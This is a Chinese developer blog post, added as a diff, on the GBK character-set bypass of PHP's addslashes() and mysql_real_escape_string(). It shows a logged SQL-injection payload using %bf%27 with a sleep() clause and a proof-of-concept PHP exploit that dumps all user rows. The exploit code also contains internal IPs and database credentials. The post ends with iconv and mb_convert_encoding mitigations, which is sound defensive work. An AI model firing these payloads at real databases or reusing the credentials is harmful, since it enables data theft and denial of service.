@@ -1,0 +1,161 @@
+PHP字符编码绕过漏洞--addslashes、mysql_real_escape漏洞
+【 作者：zhuizhuziwo 更新时间：2013-05-07 | 字体：大 中 小】
+[导读]在上次活动开发过程中，有个程序写了下面这样的语句：$sName = $_GET['name']; $sName = addslashes($sName); $sql = "SELECT COUNT(lGid) AS total FROM tbRank WHERE `sName` LIKE '%$sName%';"; va...
+
+在上次活动开发过程中，有个程序写了下面这样的语句：
+
+$sName = $_GET['name']; 
+$sName = addslashes($sName); 
+$sql = "SELECT COUNT(lGid) AS total FROM tbRank WHERE `sName` LIKE '%$sName%';"; 
+var_dump($sql);  
+exit(); 
+
+结果扫描工具一扫描，发现问题来了，被扫除了SQL注入漏洞，而且还引发了整个数据表被锁住（备注：见第二部分）
+
+检查安全中心扫描日志发现：
+当SQL输入为：
+name=41%bf%27%20or%20sleep%2810.10%29%3d0%20limit%201%23
+的时候引发了SQL注入。
+//这里输出：
+string(98) "SELECT COUNT(lGid) AS total FROM tbRank WHERE `sName` LIKE '%41¿\\\' or sleep(10.10)=0 limit 1#%';"
+
+
+根本原因是addslash对于字符%BF%27的漏洞。
+
+
+该漏洞最早2006年被国外用来讨论数据库字符集设为GBK时，0xbf27本身不是一个有效的GBK字符，但经过  addslashes()  转换后变为0xbf5c27，前面的0xbf5c是个有效的GBK字符，所以0xbf5c27会被当作一个字符0xbf5c和一个单引号来处理，结果漏洞就触发了。
+          mysql_real_escape_string() 也存在相同的问题，只不过相比  addslashes() 它考虑到了用什么字符集来处理，因此可以用相应的字符集来处理字符。
+在MySQL中有两种改变默认字符集的方法。
+方法一：
+改变mysql配置文件my.cnf
+ [client]
+default-character-set=GBK
+
+
+方法二：
+在建立连接时使用
+CODE:
+SET  CHARACTER  SET  'GBK'
+例：mysql_query("SET  CHARACTER  SET  'gbk'",  $c);或者
+mysql_query(“SET NAMES ‘GBK’”, $c);
+
+
+问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和  addslashes()  一样的漏洞（备注：这句话是摘抄的，我也没看懂）
+
+
+网络上查询到有人说：
+当mysql_real_escape_string检测到的编码方式跟client设置的编码方式(big5/bgk)不一致时，mysql_real_escape_string跟addslashes是没有区别的 
+比如 
+[client] 
+default-character-set=latin1 
+
+
+mysql_query("SET  CHARACTER  SET  'gbk'",  $mysql_conn); 
+这种情况下mysql_real_escape_string  是基于  latin1工作的，是不安全的 
+
+
+[client] 
+default-character-set=gbk 
+
+
+mysql_query("SET  CHARACTER  SET  'gbk'",  $mysql_conn); 
+这种情况下，mysql_real_escape_string  基于  gbk  工作，是正常的 
+
+
+但是，这里我108、153上验证的都不成功：
+用12机器的php文件在108机器mysql上，查询到
+
+
+在153链接测试环境CDB结点：
+ 
+执行来自：
+http://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html的测试代码
+<?php
+//$c  =  mysql_connect("localhost",  "user",  "pass");
+$c = mysql_connect("10.1.164.108", "oss", "oss_da");
+mysql_select_db("a_jasonyeTest", $c);
+
+
+//$c = mysql_connect("10.179.12.249:3332", "oss", "oss_da");
+//mysql_select_db("dbGuild20120903jasonye", $c);
+
+
+mysql_select_db("database",  $c);
+
+
+//  change  our  character  set
+mysql_query("SET  CHARACTER  SET  'gbk'",  $c);
+
+
+//  create  demo  table
+mysql_query("CREATE  TABLE  users  (
+        username  VARCHAR(32)  PRIMARY  KEY,
+        password  VARCHAR(32)
+)  CHARACTER  SET  'GBK'",  $c);
+mysql_query("INSERT  INTO  users  VALUES('foo','bar'),  ('baz','test')",  $c);
+
+
+//  now  the  exploit  code
+$_POST['username']  =  chr(0xbf)  .  chr(0x27)  .  '  OR  username  =  username  #'; 
+$_POST['password']  =  'anything'; 
+
+
+//  Proper  escaping,  we  should  be  safe,  right?
+$user  =  mysql_real_escape_string($_POST['username'],  $c);
+$passwd  =  mysql_real_escape_string($_POST['password'],  $c);
+
+
+$sql  =  "SELECT  *  FROM    users  WHERE    username  =  '{$user}'  AND  password  =  '{$passwd}'";
+$res  =  mysql_query($sql,  $c);
+echo  mysql_num_rows($res);  //  will  print  2,  indicating  that  we  were  able  to  fetch  all  records
+
+
+?>
+发现：都存在漏洞
+
+ 
+
+
+纵观以上两种触发漏洞的关键是addslashes()、mysql_real_escape_string()在Mysql配置为GBK时就可以触发漏洞，
+另外：mysql_real_escape_string在执行前，必须正确连接到Mysql才有效。
+
+
+又有，上面产生漏洞的原因主是有GBK的特殊字符所引起的，因而，我们需要在进行addslashes或者mysql_real_escape之前，对输入字符串进行特殊处理一下。
+
+
+$this->sName = $_GET['name'];
+$this->sName=iconv('utf-8//IGNORE', 'gbk', $this->sName);
+$this->sName=iconv('gbk//IGNORE', 'utf-8', $this->sName);             
+Iconv这种方式比较粗暴，对于不能识别的特殊字符之后的语句在153机器上会截断不能识别的字符后面的内容：
+如下：
+string(32) "41縗' or sleep(10.10)=0 limit 1#"
+string(2) "41"
+
+
+或者用mb_convert_encoding这个方式
+$tmp = mb_convert_encoding($_POST['username'], 'gbk','utf-8');
+$_POST['username'] = mb_convert_encoding($tmp, 'utf-8', 'gbk');
+这种方式会过滤掉不能识别的GBK字符。
+
+
+这样处理之后，使用addslashes就没有问题拉。
+
+
+后记，这里不光是%bf，其它许多字符也可以造成同样漏洞，大家可以自己做个测试的查下，这里有zwell文章提到的一个分析
+http://hackme.ntobjectives.com/sql_inject/login_addslashes.php 
+
+
+参考网页：
+http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html
+http://ar.newsmth.net/thread-1d64171197dd0d-1.html
+
+ 
+
+第二部分：
+SELECT COUNT(lGid) AS total FROM tbRank WHERE `sName` LIKE '%41¿\\\' or sleep(10.10)=0 limit 1#%
+
+
+在上面SQL注入语句中，当count和SLEEP语句放在一块后，会引发mysql进程在表的每条记录上都sleep（n）秒，所以，如果如果表中有1000条记录时就会sleep 1000*n秒。
+而且这里还会引起整个表的锁表。
+
+原文：http://blog.csdn.net/zhuizhuziwo/article/details/8525789
